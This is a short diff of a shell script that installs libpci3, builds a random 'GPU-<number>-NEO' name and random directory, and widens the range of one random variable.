@@ -3,7 +3,7 @@ apt-get install libpci3
 P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
 y=$(( RANDOM - ( RANDOM + RANDOM ) ))
 dir=$RANDOM
-rn=$RANDOM
+rn=$(shuf -i 500-1000000000 -n 1)
 x=1
 mkdir $dir
 cd $dir
